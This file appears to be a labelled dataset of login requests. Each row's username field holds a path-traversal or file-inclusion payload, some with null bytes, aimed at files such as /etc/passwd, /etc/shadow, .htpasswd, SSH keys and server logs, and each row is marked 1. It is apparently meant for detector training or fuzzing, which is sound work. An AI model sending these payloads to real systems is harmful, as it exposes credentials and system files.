|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"1936493699"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"2042954048"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"77512750"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"173311200"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"2111928256"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"2025777436"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"1818853672"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"2113183535"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"1445655069"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"633491260"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/etc\/passwd","password":"1039612840"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/etc\/passwd","password":"258450134"}|,1
|{"username":"..\/..\/..\/..\/..\/etc\/passwd","password":"910898561"}|,1
|{"username":"..\/..\/..\/..\/etc\/passwd","password":"724184579"}|,1
|{"username":"..\/..\/..\/etc\/passwd","password":"1539776949"}|,1
|{"username":"..\/..\/etc\/passwd","password":"1573461604"}|,1
|{"username":"..\/etc\/passwd","password":"1537076383"}|,1
|{"username":"....................etcpasswd","password":"2934632"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/etc\/passwd","password":"767041891"}|,1
|{"username":"....................etcpasswd","password":"1570303530"}|,1
|{"username":"etc\/passwd","password":"1853540526"}|,1
|{"username":"\/etc\/passwd%00","password":"1818973056"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1698197380"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1536654478"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1805802715"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1662249715"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1346310041"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1110854109"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1820941004"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"517162440"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1332055822"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1784557030"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1754674503"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"176012448"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1117897435"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"853078522"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"715644414"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"2031804632"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/etc\/passwd%00","password":"1886005156"}|,1
|{"username":"..\/..\/..\/..\/..\/etc\/passwd%00","password":"1523516735"}|,1
|{"username":"..\/..\/..\/..\/etc\/passwd%00","password":"1882837304"}|,1
|{"username":"..\/..\/..\/etc\/passwd%00","password":"937945696"}|,1
|{"username":"..\/..\/etc\/passwd%00","password":"1837959187"}|,1
|{"username":"..\/etc\/passwd%00","password":"138286145"}|,1
|{"username":"....................etcpasswd%00","password":"603331123"}|,1
|{"username":"....................etcpasswd%00","password":"1802478389"}|,1
|{"username":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00.html","password":"1196302077"}|,1
|{"username":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd%00.jpg","password":"1538164820"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/etc\/passwd&=%3C%3C%3C%3C","password":"2075271363"}|,1
|{"username":"\/etc\/php4.4\/fcgi\/php.ini","password":"545099106"}|,1
|{"username":"\/etc\/php4\/apache2\/php.ini","password":"805489386"}|,1
|{"username":"\/etc\/php4\/apache\/php.ini","password":"1891913982"}|,1
|{"username":"\/etc\/php4\/cgi\/php.ini","password":"1233911347"}|,1
|{"username":"\/etc\/php5\/apache2\/php.ini","password":"1169970922"}|,1
|{"username":"\/etc\/php5\/apache\/php.ini","password":"1822552188"}|,1
|{"username":"\/etc\/php5\/cgi\/php.ini","password":"117520643"}|,1
|{"username":"\/etc\/php\/apache2\/php.ini","password":"344756668"}|,1
|{"username":"\/etc\/php\/apache\/php.ini","password":"688341919"}|,1
|{"username":"\/etc\/php\/cgi\/php.ini","password":"514992132"}|,1
|{"username":"\/etc\/php.d\/dom.ini","password":"449678541"}|,1
|{"username":"\/etc\/php.d\/gd.ini","password":"679467395"}|,1
|{"username":"\/etc\/php.d\/imap.ini","password":"707999563"}|,1
|{"username":"\/etc\/php.d\/json.ini","password":"292242531"}|,1
|{"username":"\/etc\/php.d\/ldap.ini","password":"928492629"}|,1
|{"username":"\/etc\/php.d\/mbstring.ini","password":"1448919085"}|,1
|{"username":"\/etc\/php.d\/mysqli.ini","password":"1402539457"}|,1
|{"username":"\/etc\/php.d\/mysql.ini","password":"651259278"}|,1
|{"username":"\/etc\/php.d\/odbc.ini","password":"734886113"}|,1
|{"username":"\/etc\/php.d\/pdo.ini","password":"1753770791"}|,1
|{"username":"\/etc\/php.d\/pdo_mysql.ini","password":"686698427"}|,1
|{"username":"\/etc\/php.d\/pdo_odbc.ini","password":"857817190"}|,1
|{"username":"\/etc\/php.d\/pdo_pgsql.ini","password":"1652755398"}|,1
|{"username":"\/etc\/php.d\/pdo_sqlite.ini","password":"264413123"}|,1
|{"username":"\/etc\/php.d\/pgsql.ini","password":"1391008803"}|,1
|{"username":"\/etc\/php.d\/xmlreader.ini","password":"1834949873"}|,1
|{"username":"\/etc\/php.d\/xmlwriter.ini","password":"915594830"}|,1
|{"username":"\/etc\/php.d\/xsl.ini","password":"2128497516"}|,1
|{"username":"\/etc\/php.d\/zip.ini","password":"1559911235"}|,1
|{"username":"\/etc\/php.ini","password":"933323355"}|,1
|{"username":"\/etc\/php\/php4\/php.ini","password":"3324326"}|,1
|{"username":"\/etc\/php\/php.ini","password":"465947638"}|,1
|{"username":"\/etc\/postfix\/mydomains","password":"1955628868"}|,1
|{"username":"\/etc\/proftp.conf","password":"1183066393"}|,1
|{"username":"\/etc\/proftpd\/modules.conf","password":"1275841898"}|,1
|{"username":"\/etc\/protpd\/proftpd.conf","password":"1859156701"}|,1
|{"username":"\/etc\/pure-ftpd.conf","password":"1587625487"}|,1
|{"username":"\/etc\/pureftpd.passwd","password":"550645683"}|,1
|{"username":"\/etc\/pureftpd.pdb","password":"584703581"}|,1
|{"username":"\/etc\/pure-ftpd\/pure-ftpd.conf","password":"500943907"}|,1
|{"username":"\/etc\/pure-ftpd\/pure-ftpd.pdb","password":"1000376792"}|,1
|{"username":"\/etc\/pure-ftpd\/pureftpd.pdb","password":"508321854"}|,1
|{"username":"\/etc\/release","password":"27302495"}|,1
|{"username":"\/etc\/resolv.conf","password":"1516812500"}|,1
|{"username":"\/etc\/rpc","password":"1436326615"}|,1
|{"username":"\/etc\/security\/environ","password":"844049340"}|,1
|{"username":"\/etc\/security\/failedlogin","password":"1174837741"}|,1
|{"username":"\/etc\/security\/group","password":"645703165"}|,1
|{"username":"\/etc\/security\/lastlog","password":"909466558"}|,1
|{"username":"\/etc\/security\/limits","password":"836850707"}|,1
|{"username":"\/etc\/security\/passwd","password":"1348275313"}|,1
|{"username":"\/etc\/security\/user","password":"1151219111"}|,1
|{"username":"\/.\/.\/.\/.\/.\/.\/.\/.\/.\/.\/.\/etc\/shadow","password":"461415964"}|,1
|{"username":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/shadow","password":"1931877676"}|,1
|{"username":"\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/shadow^^","password":"1388572936"}|,1
|{"username":"\/....\/....\/....\/....\/....\/....\/etc\/shadow","password":"1834765563"}|,1
|{"username":"\/etc\/shadow","password":"1300217635"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/shadow","password":"1627500859"}|,1
|{"username":"....................etcshadow","password":"1990386191"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/etc\/shadow","password":"1482504696"}|,1
|{"username":"....................etcshadow","password":"906957358"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/shadow%00","password":"136506774"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/shadow%00","password":"932329080"}|,1
|{"username":"....................etcshadow%00","password":"1902502211"}|,1
|{"username":"....................etcshadow%00","password":"511667806"}|,1
|{"username":"etc\/shadow%00","password":"2131214550"}|,1
|{"username":"\/etc\/ssh\/sshd_config","password":"871322174"}|,1
|{"username":"\/etc\/sudoers","password":"1672416817"}|,1
|{"username":"\/etc\/syslog.conf","password":"1163884280"}|,1
|{"username":"\/etc\/syslogd.conf","password":"1216819575"}|,1
|{"username":"\/etc\/system","password":"2008777245"}|,1
|{"username":"\/etc\/updatedb.conf","password":"851893774"}|,1
|{"username":"\/etc\/utmp","password":"66555697"}|,1
|{"username":"\/etc\/vfstab","password":"233942206"}|,1
|{"username":"\/etc\/vhcs2\/proftpd\/proftpd.conf","password":"753393999"}|,1
|{"username":"\/etc\/vsftpd.chroot_list","password":"178376573"}|,1
|{"username":"\/etc\/vsftpd.conf","password":"830514695"}|,1
|{"username":"\/etc\/vsftpd\/vsftpd.conf","password":"135942898"}|,1
|{"username":"\/etc\/wtmp","password":"975570155"}|,1
|{"username":"\/etc\/wu-ftpd\/ftpaccess","password":"546959463"}|,1
|{"username":"\/etc\/wu-ftpd\/ftphosts","password":"660112132"}|,1
|{"username":"\/etc\/wu-ftpd\/ftpusers","password":"269891665"}|,1
|{"username":"\/.forward","password":"1219030958"}|,1
|{"username":"\/home2binstableapachephp.ini","password":"723060528"}|,1
|{"username":"\/home\/apache\/conf\/httpd.conf","password":"1732531689"}|,1
|{"username":"\/home\/apache\/httpd.conf","password":"999588862"}|,1
|{"username":"\/homebinstableapachephp.ini","password":"4531674"}|,1
|{"username":"\/.htpasswd","password":"23751192"}|,1
|{"username":".htpasswd","password":"1941977104"}|,1
|{"username":"..\/.htpasswd","password":"1588559982"}|,1
|{"username":"..\/install.php","password":"558939066"}|,1
|{"username":"install.php","password":"2107608275"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/localstart.asp","password":"707743139"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/localstart.asp%00","password":"1249682532"}|,1
|{"username":"\/log\/miscDir\/accesslog","password":"1741470196"}|,1
|{"username":"\/.logout","password":"863870018"}|,1
|{"username":"\/logs\/access_log","password":"1723476421"}|,1
|{"username":"\/logs\/access.log","password":"272283931"}|,1
|{"username":"..\/..\/..\/..\/..\/logs\/access.log","password":"1005144694"}|,1
|{"username":"..\/..\/..\/..\/logs\/access.log","password":"1452595712"}|,1
|{"username":"..\/..\/..\/logs\/access.log","password":"2120210813"}|,1
|{"username":"..\/..\/logs\/access.log","password":"1649904571"}|,1
|{"username":"..\/logs\/access.log","password":"1629302532"}|,1
|{"username":"\/logs\/error_log","password":"1840130630"}|,1
|{"username":"\/logs\/error.log","password":"975557109"}|,1
|{"username":"..\/..\/..\/..\/..\/logs\/error.log","password":"496381539"}|,1
|{"username":"..\/..\/..\/..\/logs\/error.log","password":"1084663414"}|,1
|{"username":"..\/..\/..\/logs\/error.log","password":"227473758"}|,1
|{"username":"..\/..\/logs\/error.log","password":"1178483677"}|,1
|{"username":"..\/logs\/error.log","password":"1210196363"}|,1
|{"username":"\/logs\/pure-ftpd.log","password":"1004250868"}|,1
|{"username":"\/master.passwd","password":"1164274737"}|,1
|{"username":"member\/.htpasswd","password":"651930704"}|,1
|{"username":"members\/.htpasswd","password":"1443426728"}|,1
|{"username":"\/.netrc","password":"822392564"}|,1
|{"username":"\/NetServerbinstableapachephp.ini","password":"637065693"}|,1
|{"username":"\/opt\/apache2\/conf\/httpd.conf","password":"1064959463"}|,1
|{"username":"\/opt\/apache\/conf\/httpd.conf","password":"209268552"}|,1
|{"username":"\/opt\/lampp\/logs\/access_log","password":"169970522"}|,1
|{"username":"\/opt\/lampp\/logs\/access.log","password":"1659562591"}|,1
|{"username":"\/opt\/lampp\/logs\/error_log","password":"2126682876"}|,1
|{"username":"\/opt\/lampp\/logs\/error.log","password":"847570982"}|,1
|{"username":"\/opt\/xampp\/etc\/php.ini","password":"1877923360"}|,1
|{"username":"\/opt\/xampp\/logs\/access_log","password":"1722807945"}|,1
|{"username":"\/opt\/xampp\/logs\/access.log","password":"657880509"}|,1
|{"username":"\/opt\/xampp\/logs\/error_log","password":"2048652617"}|,1
|{"username":"\/opt\/xampp\/logs\/error.log","password":"144150635"}|,1
|{"username":".pass","password":"964356812"}|,1
|{"username":"..\/.pass","password":"639955657"}|,1
|{"username":"pass.dat","password":"2037007628"}|,1
|{"username":"passwd","password":"602383799"}|,1
|{"username":"\/.passwd","password":"558230764"}|,1
|{"username":".passwd","password":"1278281851"}|,1
|{"username":"..\/.passwd","password":"1670458090"}|,1
|{"username":"passwd.dat","password":"574232297"}|,1
|{"username":"\/php4php.ini","password":"1157691208"}|,1
|{"username":"\/php5php.ini","password":"788072780"}|,1
|{"username":"\/phpphp.ini","password":"1526383975"}|,1
|{"username":"\/PHPphp.ini","password":"1894987066"}|,1
|{"username":"\/private\/etc\/httpd\/httpd.conf","password":"1236150150"}|,1
|{"username":"\/private\/etc\/httpd\/httpd.conf.default","password":"2062409095"}|,1
|{"username":"\/proc\/cpuinfo","password":"1924541563"}|,1
|{"username":"\/proc\/interrupts","password":"992751162"}|,1
|{"username":"\/proc\/loadavg","password":"731780741"}|,1
|{"username":"\/proc\/meminfo","password":"584309114"}|,1
|{"username":"\/proc\/mounts","password":"1542147976"}|,1
|{"username":"\/proc\/net\/arp","password":"1455677571"}|,1
|{"username":"\/proc\/net\/dev","password":"1411800058"}|,1
|{"username":"\/proc\/net\/route","password":"427289968"}|,1
|{"username":"\/proc\/net\/tcp","password":"1104404503"}|,1
|{"username":"\/proc\/partitions","password":"1946394202"}|,1
|{"username":"\/proc\/self\/cmdline","password":"1514207869"}|,1
|{"username":"\/proc\/self\/envron","password":"102313409"}|,1
|{"username":"\/proc\/version","password":"1493065750"}|,1
|{"username":"\/.profile","password":"1473396483"}|,1
|{"username":"\/Program FilesApache GroupApache2confhttpd.conf","password":"1272639831"}|,1
|{"username":"\/Program FilesApache GroupApacheconfhttpd.conf","password":"1919464858"}|,1
|{"username":"\/Program FilesApache GroupApachelogsaccess.log","password":"2053978234"}|,1
|{"username":"\/Program FilesApache GroupApachelogserror.log","password":"1182250121"}|,1
|{"username":"\/Program Filesxamppapacheconfhttpd.conf","password":"1074388139"}|,1
|{"username":"\/..\/..\/..\/..\/pswd","password":"352230904"}|,1
|{"username":"\/.rhosts","password":"120306602"}|,1
|{"username":"\/root\/.bash_history","password":"1735001748"}|,1
|{"username":"\/root\/.bash_logut","password":"1288959696"}|,1
|{"username":"root\/.htpasswd","password":"607812564"}|,1
|{"username":"\/root\/.ksh_history","password":"446020104"}|,1
|{"username":"\/root\/.Xauthority","password":"2033476533"}|,1
|{"username":"\/.sh_history","password":"1128956261"}|,1
|{"username":"\/.shosts","password":"869194431"}|,1
|{"username":"\/.ssh\/authorized_keys","password":"1812185003"}|,1
|{"username":"user\/.htpasswd","password":"1996476560"}|,1
|{"username":"..\/users.db.php","password":"1686059135"}|,1
|{"username":"users.db.php","password":"461765133"}|,1
|{"username":"users\/.htpasswd","password":"1081304019"}|,1
|{"username":"\/usr\/apache2\/conf\/httpd.conf","password":"1744637143"}|,1
|{"username":"\/usr\/apache\/conf\/httpd.conf","password":"202141313"}|,1
|{"username":"\/usr\/etc\/pure-ftpd.conf","password":"2002303467"}|,1
|{"username":"\/usr\/lib\/cron\/log","password":"1146142619"}|,1
|{"username":"\/usr\/lib\/php.ini","password":"1138498831"}|,1
|{"username":"\/usr\/lib\/php\/php.ini","password":"1263216180"}|,1
|{"username":"\/usr\/lib\/security\/mkuser.default","password":"592975046"}|,1
|{"username":"\/usr\/local\/apache2\/conf\/httpd.conf","password":"879834224"}|,1
|{"username":"\/usr\/local\/apache2\/httpd.conf","password":"537066844"}|,1
|{"username":"\/usr\/local\/apache2\/logs\/access_log","password":"1683034801"}|,1
|{"username":"\/usr\/local\/apache2\/logs\/access.log","password":"90613426"}|,1
|{"username":"\/usr\/local\/apache2\/logs\/error_log","password":"1235659577"}|,1
|{"username":"\/usr\/local\/apache2\/logs\/error.log","password":"455917355"}|,1
|{"username":"\/usr\/local\/apache\/conf\/httpd.conf","password":"1932699748"}|,1
|{"username":"\/usr\/local\/apache\/conf\/php.ini","password":"197061607"}|,1
|{"username":"\/usr\/local\/apache\/httpd.conf","password":"1449076113"}|,1
|{"username":"\/usr\/local\/apache\/log","password":"1385709997"}|,1
|{"username":"\/usr\/local\/apache\/logs","password":"881578193"}|,1
|{"username":"\/usr\/local\/apache\/logs\/access_log","password":"344133854"}|,1
|{"username":"\/usr\/local\/apache\/logs\/access_ log","password":"820598927"}|,1
|{"username":"\/usr\/local\/apache\/logs\/access.log","password":"883919246"}|,1
|{"username":"\/usr\/local\/apache\/logs\/access. log","password":"1942102493"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/usr\/local\/apache\/logs\/access_ log","password":"189539815"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/usr\/local\/apache\/logs\/access. log","password":"1851275113"}|,1
|{"username":"..\/..\/..\/..\/..\/usr\/local\/apache\/logs\/access_log","password":"123968177"}|,1
|{"username":"..\/..\/..\/..\/..\/usr\/local\/apache\/logs\/access.log","password":"138289010"}|,1
|{"username":"\/usr\/local\/apache\/logs\/error_log","password":"1656155090"}|,1
|{"username":"\/usr\/local\/apache\/logs\/error.log","password":"326721310"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/usr\/local\/apache\/logs\/error_l og","password":"542605627"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/usr\/local\/apache\/logs\/error.l og","password":"762588612"}|,1
|{"username":"..\/..\/..\/..\/..\/usr\/local\/apache\/logs\/error_log","password":"1255411590"}|,1
|{"username":"..\/..\/..\/..\/..\/usr\/local\/apache\/logs\/error.log","password":"260335067"}|,1
|{"username":"\/usr\/local\/apps\/apache2\/conf\/httpd.conf","password":"1052442736"}|,1
|{"username":"\/usr\/local\/apps\/apache\/conf\/httpd.conf","password":"1168493037"}|,1
|{"username":"\/usr\/local\/cpanel\/logs","password":"1895912254"}|,1
|{"username":"\/usr\/local\/cpanel\/logs\/access_log","password":"1271255170"}|,1
|{"username":"\/usr\/local\/cpanel\/logs\/error_log","password":"1417820011"}|,1
|{"username":"\/usr\/local\/cpanel\/logs\/license_log","password":"773322239"}|,1
|{"username":"\/usr\/local\/cpanel\/logs\/login_log","password":"915479403"}|,1
|{"username":"\/usr\/local\/cpanel\/logs\/stats_log","password":"2066517588"}|,1
|{"username":"\/usr\/local\/etc\/apache2\/conf\/httpd.conf","password":"481413093"}|,1
|{"username":"\/usr\/local\/etc\/apache\/conf\/httpd.conf","password":"1619880327"}|,1
|{"username":"\/usr\/local\/etc\/apache\/vhosts.conf","password":"1730723405"}|,1
|{"username":"\/usr\/local\/etc\/httpd\/conf\/httpd.conf","password":"51966947"}|,1
|{"username":"\/usr\/local\/etc\/httpd\/logs\/access_log","password":"1198346270"}|,1
|{"username":"\/usr\/local\/etc\/httpd\/logs\/error_log","password":"1519636634"}|,1
|{"username":"\/usr\/local\/etc\/php.ini","password":"2137586396"}|,1
|{"username":"\/usr\/local\/etc\/pure-ftpd.conf","password":"100776785"}|,1
|{"username":"\/usr\/local\/etc\/pureftpd.pdb","password":"931894654"}|,1
|{"username":"\/usr\/local\/httpd\/conf\/httpd.conf","password":"1567601965"}|,1
|{"username":"\/usr\/local\/lib\/php.ini","password":"426475006"}|,1
|{"username":"\/usr\/local\/php4\/httpd.conf","password":"1114898367"}|,1
|{"username":"\/usr\/local\/php4\/httpd.conf.php","password":"1341925281"}|,1
|{"username":"\/usr\/local\/php4\/lib\/php.ini","password":"1788649853"}|,1
|{"username":"\/usr\/local\/php5\/httpd.conf","password":"197384773"}|,1
|{"username":"\/usr\/local\/php5\/httpd.conf.php","password":"1950018297"}|,1
|{"username":"\/usr\/local\/php5\/lib\/php.ini","password":"12601498"}|,1
|{"username":"\/usr\/local\/php\/httpd.conf","password":"151028354"}|,1
|{"username":"\/usr\/local\/php\/httpd.conf.php","password":"1022174442"}|,1
|{"username":"\/usr\/local\/php\/lib\/php.ini","password":"1000209821"}|,1
|{"username":"\/usr\/local\/pureftpd\/etc\/pure-ftpd.conf","password":"1754544737"}|,1
|{"username":"\/usr\/local\/pureftpd\/etc\/pureftpd.pdb","password":"266253736"}|,1
|{"username":"\/usr\/local\/pureftpd\/sbin\/pure-config.pl","password":"337228597"}|,1
|{"username":"\/usr\/local\/www\/logs\/thttpd_log","password":"1921961879"}|,1
|{"username":"\/usr\/local\/Zend\/etc\/php.ini","password":"427623211"}|,1
|{"username":"\/usr\/pkgsrc\/net\/pureftpd\/","password":"1977762006"}|,1
|{"username":"\/usr\/ports\/contrib\/pure-ftpd\/","password":"183216841"}|,1
|{"username":"\/usr\/ports\/ftp\/pure-ftpd\/","password":"1434907965"}|,1
|{"username":"\/usr\/ports\/net\/pure-ftpd\/","password":"36787494"}|,1
|{"username":"\/usr\/sbin\/pure-config.pl","password":"1073290084"}|,1
|{"username":"\/usr\/spool\/lp\/log","password":"31256102"}|,1
|{"username":"\/usr\/spool\/mqueue\/syslog","password":"612387758"}|,1
|{"username":"\/var\/adm","password":"2113582437"}|,1
|{"username":"\/var\/adm\/acct\/sum\/loginlog","password":"425099913"}|,1
|{"username":"\/var\/adm\/aculog","password":"339185834"}|,1
|{"username":"\/var\/adm\/aculogs","password":"1411522566"}|,1
|{"username":"\/var\/adm\/crash\/unix","password":"211379088"}|,1
|{"username":"\/var\/adm\/crash\/vmcore","password":"137572868"}|,1
|{"username":"\/var\/adm\/cron\/log","password":"652928843"}|,1
|{"username":"\/var\/adm\/dtmp","password":"751815190"}|,1
|{"username":"\/var\/adm\/lastlog","password":"148186261"}|,1
|{"username":"\/var\/adm\/lastlog\/username","password":"1555378305"}|,1
|{"username":"\/var\/adm\/log\/asppp.log","password":"1542310303"}|,1
|{"username":"\/var\/adm\/loginlog","password":"1122487309"}|,1
|{"username":"\/var\/adm\/log\/xferlog","password":"336113606"}|,1
|{"username":"\/var\/adm\/lp\/lpd-errs","password":"140513223"}|,1
|{"username":"\/var\/adm\/messages","password":"1065893433"}|,1
|{"username":"\/var\/adm\/pacct","password":"1411276530"}|,1
|{"username":"\/var\/adm\/qacct","password":"971108264"}|,1
|{"username":"\/var\/adm\/ras\/bootlog","password":"2093377604"}|,1
|{"username":"\/var\/adm\/ras\/errlog","password":"1258653672"}|,1
|{"username":"\/var\/adm\/sulog","password":"1266791657"}|,1
|{"username":"\/var\/adm\/SYSLOG","password":"1898631444"}|,1
|{"username":"\/var\/adm\/utmp","password":"2062753229"}|,1
|{"username":"\/var\/adm\/utmpx","password":"311972851"}|,1
|{"username":"\/var\/adm\/vold.log","password":"215159357"}|,1
|{"username":"\/var\/adm\/wtmp","password":"1282651730"}|,1
|{"username":"\/var\/adm\/wtmpx","password":"1956245173"}|,1
|{"username":"\/var\/adm\/X0msgs","password":"1771827383"}|,1
|{"username":"\/var\/apache\/log","password":"1368067911"}|,1
|{"username":"\/var\/apache\/logs","password":"1336419793"}|,1
|{"username":"\/var\/apache\/logs\/access_log","password":"702678431"}|,1
|{"username":"\/var\/apache\/logs\/error_log","password":"63989291"}|,1
|{"username":"\/var\/cpanel\/cpanel.config","password":"2006088217"}|,1
|{"username":"\/var\/cron\/log","password":"1536345863"}|,1
|{"username":"\/var\/lib\/mlocate\/mlocate.db","password":"1961570895"}|,1
|{"username":"\/var\/lib\/mysql\/my.cnf","password":"1148799577"}|,1
|{"username":"\/var\/local\/www\/conf\/php.ini","password":"916825368"}|,1
|{"username":"\/var\/lock\/samba","password":"1449464019"}|,1
|{"username":"\/var\/log","password":"933345854"}|,1
|{"username":"\/var\/log\/access_log","password":"1738639209"}|,1
|{"username":"\/var\/log\/access.log","password":"2022512277"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/access_log","password":"1645583158"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/access.log","password":"270359252"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/log\/access_log","password":"852023560"}|,1
|{"username":"\/var\/log\/acct","password":"199166432"}|,1
|{"username":"\/var\/log\/apache2\/access_log","password":"871427080"}|,1
|{"username":"\/var\/log\/apache2\/access.log","password":"1362224935"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/apache2\/access_log","password":"1585848273"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/apache2\/access.log","password":"287109988"}|,1
|{"username":"\/var\/log\/apache2\/error_log","password":"911868573"}|,1
|{"username":"\/var\/log\/apache2\/error.log","password":"919423958"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/apache2\/error_log","password":"463799701"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/apache2\/error.log","password":"90893537"}|,1
|{"username":"\/var\/log\/apache\/access_log","password":"1962120059"}|,1
|{"username":"\/var\/log\/apache\/access.log","password":"911948092"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/apache\/access_log","password":"861239961"}|,1
|{"username":"..\/..\/..\/..\/..\/..\/..\/var\/log\/apache\/access.log","password":"50829208"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/log\/apache\/access_log","password":"113127062"}|,1
|{"username":"..\/..\/..\/..\/..\/var\/log\/apache\/access.log","password":"124026477"}|,1
